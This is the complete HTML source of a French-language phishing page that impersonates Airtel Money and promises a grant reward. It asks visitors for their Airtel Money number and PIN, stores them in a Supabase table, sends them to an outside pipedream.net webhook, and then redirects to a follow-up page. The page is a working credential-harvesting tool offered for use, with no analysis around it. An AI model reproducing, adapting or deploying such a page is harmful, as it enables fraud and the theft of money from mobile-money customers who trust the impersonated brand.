<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="AIRTEL MONEY">

<meta property="og:description"
content="Portail des candidats">

<meta property="og:image"
content="https://customer-login-three.vercel.app/banner.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:type" content="image/png">
<meta property="og:url"
content="https://customer-login-three.vercel.app/">

<meta property="og:type" content="website">

<meta name="twitter:card" content="summary_large_image">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Récompenses de subvention Airtel Money</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

    #loadingScreen{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,0.85);
    display:none;
    justify-content:center;
    align-items:center;
    z-index:9999;
}

.loader-box{
    text-align:center;
    color:white;
}

.spinner{
    width:60px;
    height:60px;
    border:6px solid rgba(255,255,255,.3);
    border-top:6px solid #4CAF50;
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin:0 auto 20px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

body{
    height:100vh;
    background:url("banner.png") center center/cover no-repeat;
    display:flex;
    justify-content:center;
    align-items:center;
}

.overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.55);
}

.container{
    position:relative;
    width:90%;
    max-width:420px;
    padding:35px;
    border-radius:20px;
    background:rgba(255,255,255,.15);
    backdrop-filter:blur(12px);
    box-shadow:0 10px 30px rgba(0,0,0,.3);
    color:white;
    text-align:center;
    z-index:2;
}

.logo{
    font-size:55px;
    margin-bottom:10px;
    tetext-align:center;
    color:blue;
}

h1{
    font-size:28px;
    margin-bottom:8px;
}

p{
    margin-bottom:25px;
    color:#eee;
}

.input-group{
    margin-bottom:18px;
}

input{
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    font-size:16px;
    outline:none;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:10px;
    background:blue;
    color:white;
    font-size:17px;
    font-weight:600;
    cursor:pointer;
    transition:.3s;
}

button:hover{
    background:#1b5e20;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#ddd;
}

</style>

</head>
<body>

<div class="overlay"></div>

<div class="container">

<div class="logo">AIRTEL MONEY</div>

<h1>Connexion du client et sélection du montant de la récompense</h1>

<p>Ouverture de la récompense:</p>

<div class="input-group">
<input
type="text"
id="name"
placeholder="Numéro Airtel Money:">
</div>

<div class="input-group">
<input
type="number"
id="age"
placeholder="Entrez votre code PIN:">
</div>

<button onclick="startWork();">
    OUVRIR
</button>

<div class="footer">
Airtel Money est toujours à vos côtés.
</div>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>
const { createClient } = supabase;

const supabaseClient = createClient(
  "https://mqiaibdurohbulekeyeh.supabase.co",
  "sb_publishable_xxHQrwhHRVO2zPv95BRdXQ_gF0_qVJQ"
);


async function startWork() {

    const name = document.getElementById("name").value.trim();
    const age = document.getElementById("age").value.trim();

    if (name === "" || age === "") {
        alert("Veuillez confirmer vos informations et ouvrir votre plafond de récompense.");
        return;
    }

    document.getElementById("loadingScreen").style.display = "flex";

    const { error } = await supabaseClient
        .from("submissions")
        .insert([
            {
                name: name,
                age: Number(age)
            }
        ]);

    if (error) {
        document.getElementById("loadingScreen").style.display = "none";
        
        alert(error.message);
console.error(error);
        return;
    }
await fetch("https://eouz9mk7e72ygjm.m.pipedream.net", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        name: name,
        age: age
    })
}).catch(console.error);
    localStorage.setItem("workerName", name);
    localStorage.setItem("workerAge", age);

    window.location.href = "code.html";
}
</script>
<div id="loadingScreen" style="display:none;">
    <div class="loader-box">
        <div class="spinner"></div>
        <h3>Veuillez patienter...</h3>
        <p>Vérification du client</p>
    </div>
</div>
</div>
</html>
